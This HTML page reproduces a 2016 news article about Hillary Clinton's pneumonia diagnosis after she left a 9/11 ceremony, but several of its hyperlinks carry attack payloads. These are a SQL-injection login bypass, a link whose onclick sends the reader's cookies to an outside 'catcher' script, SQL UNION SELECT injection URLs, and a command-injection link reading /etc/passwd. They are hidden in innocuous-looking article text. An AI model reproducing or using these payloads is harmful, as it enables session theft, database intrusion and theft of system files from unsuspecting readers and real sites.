<h2>Hillary Clinton’s Doctor Says Pneumonia Led to Abrupt Exit From 9/11 Event</h2>

<p class="details">By JONATHAN MARTIN and AMY CHOZICKSEPT. 12, 2016  <a href="#"></a> </p>


<p>

Hillary Clinton is being treated for <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
271&submit=Login" target="_blank">pneumonia and dehydration </a>, her doctor said on Sunday, hours after she abruptly left a ceremony in New York honoring the <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> 15th anniversary of the Sept. 11 </a> attacks and had to be helped into a van by Secret Service agents.
</p> <p>

The incident, which occurred after months of questions about her health from her Republican opponent, Donald J. Trump, and his campaign, is likely to increase pressure on Mrs. Clinton to address the issue and release detailed medical records, which she has so far declined to do.
</p> 

<p><img class="alignright" src="/images/hillary-clinton-ill.jpg" width="350" height="350" alt="Hillary-clinton-ill" /></p>
</p> <p>
Mrs. Clinton was taken from the morning event at ground zero to the Manhattan apartment of her daughter, Chelsea. About 90 minutes after arriving there, Mrs. Clinton emerged from the apartment in New York’s Flatiron district. She waved to onlookers and posed for  <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> pictures with a little girl on the sidewalk.</a>
</p> <p>
“I’m feeling great,” Mrs. Clinton said. “It’s a beautiful day in New York.”
</p> <p>
Mrs. Clinton left in her motorcade without the group of reporters that is designated to travel with her in public. A campaign spokesman, Nick Merrill, indicated that she had returned to her <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> Chappaqua, N.Y.,</a> residence sometime after 1 p.m., and Mrs. Clinton was not seen publicly the rest of the day.
</p> <p>
Mr. Merrill initially described Mrs. Clinton, the Democratic presidential nominee, as feeling “overheated” at the commemoration ceremony.
</p> <p>
But just after 5 p.m., a campaign official said Mrs. Clinton’s physician, Dr. Lisa R. Bardack, had examined the candidate at her home in Chappaqua, and Dr. Bardack said in a statement that Mrs. Clinton was <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank" > “rehydrated and recovering nicely.”</a>
</p> <p>
“Secretary Clinton has been experiencing a cough related to allergies,” Dr. Bardack’s statement said, adding that on Friday morning, after a prolonged cough, Mrs. Clinton was given a diagnosis of pneumonia.
